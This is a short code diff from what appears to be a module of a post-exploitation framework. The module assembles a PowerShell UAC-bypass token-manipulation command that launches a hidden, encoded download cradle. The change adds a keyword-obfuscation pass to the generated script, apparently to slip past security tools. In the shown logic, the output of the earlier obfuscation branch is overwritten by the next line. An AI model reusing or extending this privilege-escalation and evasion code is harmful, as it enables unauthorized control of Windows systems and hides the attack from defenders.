@@ -166,11 +166,13 @@ class Module(object):
 
         except Exception as e:
             pass
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                           obfuscationCommand=obfuscationCommand)
         scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
 
         return script
 
